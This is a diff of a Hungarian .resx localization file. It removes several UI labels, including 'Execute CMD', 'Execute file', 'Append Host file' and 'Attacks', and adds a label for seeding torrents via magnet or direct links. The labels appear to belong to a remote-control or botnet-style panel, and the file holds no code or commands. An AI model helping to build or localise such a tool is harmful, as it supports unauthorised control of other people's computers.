@@ -117,40 +117,7 @@
   <resheader name="writer">
     <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </resheader>
-  <data name="Append Host file" xml:space="preserve">
-    <value>Hozzáad hostfilehoz</value>
-  </data>
-  <data name="Attacks" xml:space="preserve">
-    <value>Támadások</value>
-  </data>
-  <data name="Chose" xml:space="preserve">
-    <value>Válasz</value>
-  </data>
-  <data name="Commands" xml:space="preserve">
-    <value>Parancsok</value>
-  </data>
-  <data name="Execute CMD" xml:space="preserve">
-    <value>Cmd végrehajtása</value>
-  </data>
-  <data name="Execute file" xml:space="preserve">
-    <value>Fájl végrahajtása</value>
-  </data>
-  <data name="General commands" xml:space="preserve">
-    <value>Általános parancsok</value>
-  </data>
-  <data name="Layer" xml:space="preserve">
-    <value>Réteg</value>
-  </data>
-  <data name="Open website" xml:space="preserve">
-    <value>Website megnyitása</value>
-  </data>
-  <data name="Save Ad" xml:space="preserve">
-    <value>Reklám mentése</value>
-  </data>
-  <data name="Seed torrent" xml:space="preserve">
-    <value>Torrent seedelése</value>
-  </data>
-  <data name="Send Message" xml:space="preserve">
-    <value>Üzenet küldése</value>
+  <data name="Seed torrent magnet link or Torrent file direct link" xml:space="preserve">
+    <value>Torrent seedelése megnet link vagy Torrent közvetlen linkkel</value>
   </data>
 </root>
